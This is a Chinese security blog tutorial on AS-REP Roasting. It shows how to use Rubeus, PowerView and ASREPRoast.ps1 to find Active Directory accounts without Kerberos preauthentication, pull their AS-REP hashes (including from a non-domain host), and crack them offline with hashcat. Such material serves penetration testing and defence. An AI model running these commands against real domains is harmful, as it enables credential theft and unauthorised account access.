> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489128&idx=1&sn=dac676323e81307e18dd7f6c8998bde7&chksm=fc7812b5cb0f9ba3a63c447468b7e1bdf3250ed0a6217b07a22819c816a8da1fdf16c164fce2&scene=21#wechat_redirect)

作者：谢公子  

作者：谢公子

  

CSDN 安全博客专家，擅长渗透测试、Web 安全攻防、红蓝对抗。其自有公众号：谢公子学安全

免责声明：本公众号发布的文章均转载自互联网或经作者投稿授权的原创，文末已注明出处，其内容和图片版权归原网站或作者本人所有，并不代表安全 + 的观点，若有无意侵权或转载不当之处请联系我们处理，谢谢合作！

**欢迎各位添加微信号：qinchang_198231** 

**加入安全 + 交流群 和大佬们一起交流安全技术**

**AS-REP Roasting 攻击**  

AS-REP Roasting 是一种对用户账号进行离线爆破的攻击方式。但是该攻击方式利用比较局限，因为其需要用户账号设置 "Do not require Kerberos preauthentication(不需要 kerberos 预身份验证)" 。而该属性默认是没有勾选上的。

预身份验证是 Kerberos 身份验证的第一步 (AS_REQ & AS_REP)，它的主要作用是防止密码脱机爆破。默认情况下，预身份验证是开启的，KDC 会记录密码错误次数，防止在线爆破。关于 AS_REQ & AS_REP：[域内认证之 Kerberos 协议详解。](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488900&idx=3&sn=dc2689efec7757f7b432e1fb38b599d4&chksm=fc781159cb0f984f1a44668d9e77d373e4b3bfa25e5fcb1512251e699d17d2b0da55348a2210&scene=21#wechat_redirect)

当关闭了预身份验证后，攻击者可以使用指定用户去请求票据，此时域控不会作任何验证就将 TGT 票据 和 该用户 Hash 加密的 Session Key 返回。因此，攻击者就可以对获取到的 用户 Hash 加密的 Session Key 进行离线破解，如果破解成功，就能得到该指定用户的密码明文。

  

![图片](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXuyl4pT17hccmcCARV1LkQgHbSbAH9xO0BJtGeIOweTgMpdsNjkc56w/640?wx_fmt=gif)

  

**AS-REP Roasting 攻击条件**

*   域用户设置了 “Do not require Kerberos preauthentication(不需要 kerberos 预身份验证) ”
    
*   需要一台可与 KDC 进行通信的主机 / 用户
    

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXnZkAU5OSrSm1AudPlsAhIibwrglRQC1dOQiar5PucQUaO3eBnAxKz5Jg/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXuyl4pT17hccmcCARV1LkQgHbSbAH9xO0BJtGeIOweTgMpdsNjkc56w/640?wx_fmt=gif)

  

**普通域用户下**

方法一：使用 Rubeus.exe

  

1：使用 rubeus.exe 获得 Hash

```
Rubeus.exe asreproast
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXQYrvq2OwGiabyAXgHLUWH4sHGzUocqFH451CicTpSl2UOq6XScqnZOSg/640?wx_fmt=png)

  

2：使用 hashcat 对获得的 Hash 进行爆破

将 hash.txt 里面的除 Hash 字段其他的都删除，复制到 hashcat 目录下，并且修改为 hashcat 能识别的格式，在 $krb5asrep 后面添加 $23 拼接。

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFX3eVBSrs0OhWVWZ83WD7hJ2NIicAB3RmUkB3m7oJR0LDg1X73ERIjYTA/640?wx_fmt=png)

然后使用以下命令爆破

```
hashcat64.exe -m 18200 hash.txt pass.txt --force
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFX6oP4eYRXwxZKEGELE7mOpfplfLw384xW222XgqnMm5LRVHE3ibo3fvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXYLdr8le2toyvNKSCtGyjm8LPh7bsPQREM2wvVYS2FwVTPQn5qlmbrQ/640?wx_fmt=png)

方法二：使用 powershell 脚本

  

1：使用 Empire 下的 powerview.ps1 查找域中设置了 "不需要 kerberos 预身份验证" 的用户

```
Import-Module .\powerview.ps1
 Get-DomainUser -PreauthNotRequired
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXfMZxzN9R9QthfaZ6ibWfrzwyjNOfchVDFOHZecnP7MJgcEWLziaajic2A/640?wx_fmt=png)

2：使用 ASREPRoast.ps1 获取 AS-REP 返回的 Hash

```
Import-Module .\ASREPRoast.ps1
Get-ASREPHash -UserName hack2 -Domain xie.com | Out-File -Encoding ASCII hash.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXLUBn3u3jViattByGllic9fpCXZibtapkUzP3qZwae4ysKxJnepHIPvjWA/640?wx_fmt=png)

3：使用 hashcat 对获得的 Hash 进行爆破

将 hash.txt 复制到 hashcat 目录下，并且修改为 hashcat 能识别的格式，在 $krb5asrep 后面添加 $23 拼接。然后使用以下命令爆破。

```
hashcat64.exe -m 18200 hash.txt pass.txt --force
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFX6oP4eYRXwxZKEGELE7mOpfplfLw384xW222XgqnMm5LRVHE3ibo3fvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXYLdr8le2toyvNKSCtGyjm8LPh7bsPQREM2wvVYS2FwVTPQn5qlmbrQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXuyl4pT17hccmcCARV1LkQgHbSbAH9xO0BJtGeIOweTgMpdsNjkc56w/640?wx_fmt=gif)

  

**非域内机器**

1：对于非域内的机器，无法通过 LDAP 来发起用户名的查询。

2：所以要想获取 "不需要 kerberos 预身份验证" 的域内账号，只能通过枚举用户名的方式来获得。而 AS-REP Hash 方面。非域内的主机，只要能和 DC 通信，便可以获取到。使用 Get-ASREPHash，通过指定 Server 的参数即可

```
Import-Module .\ASREPRoast.ps1
Get-ASREPHash -UserName hack2 -Domain xie.com -Server 192.168.10.131 | Out-File -Encoding ASCII hash.txt
```

3：获取到 Hash 后，使用 hashcat 对其爆破，和上面一样，这里就不演示了。

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXuyl4pT17hccmcCARV1LkQgHbSbAH9xO0BJtGeIOweTgMpdsNjkc56w/640?wx_fmt=gif)

  

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXeFHD0DTqaBhq6AQCK1nXpGVXVDiaNpLl8KrnTMic7bHqcuNB5Ks7xIwA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFX8MkGQf1mCKFC3lzCZtDckiab5E4UErDkzQV8K9tSPdakVoDmMiaJ99hg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXjI4s20jhnATCoNN7eE5P9TMppg2IicMm9UctFvABQYFXSehicjT5QvKQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFjGibCQezQKY4NzE1WGn6FBCbq3pQVl0oONnYXT354mlVw0edib6X6flYib9JRTic4DTibgib15WZC7sDUA/640?wx_fmt=png)

[内网渗透 | 内网穿透工具 FRP 的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489057&idx=3&sn=f81ef113f1f136c2289c8bca24c5deb1&chksm=fc7812fccb0f9beaa65e5e9cf40cf9797d207627ae30cb8c7d42d8c12a2cb0765700860dab84&scene=21#wechat_redirect)  

[内网渗透（四） | 域渗透之 Kerberoast 攻击_Python](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488972&idx=1&sn=87a6d987de72a03a2710f162170cd3a0&chksm=fc781111cb0f98070f74377f8348c529699a5eea8497fd40d254cf37a1f54f96632da6a96d83&scene=21#wechat_redirect)  

[内网渗透（三） | 域渗透之 SPN 服务主体名称](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488936&idx=1&sn=82c127c8ad6d3e36f1a977e5ba122228&chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&scene=21#wechat_redirect)  

[内网渗透（二） | MSF 和 CobaltStrike 联动](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488905&idx=2&sn=6e15c9c5dd126a607e7a90100b6148d6&chksm=fc781154cb0f98421e25a36ddbb222f3378edcda5d23f329a69a253a9240f1de502a00ee983b&scene=21#wechat_redirect)  

[内网渗透 | 域内认证之 Kerberos 协议详解](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488900&idx=3&sn=dc2689efec7757f7b432e1fb38b599d4&chksm=fc781159cb0f984f1a44668d9e77d373e4b3bfa25e5fcb1512251e699d17d2b0da55348a2210&scene=21#wechat_redirect)  

[内网渗透（一） | 搭建域环境](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488866&idx=2&sn=89f9ca5dec033f01e07d85352eec7387&chksm=fc7811bfcb0f98a9c2e5a73444678020b173364c402f770076580556a053f7a63af51acf3adc&scene=21#wechat_redirect)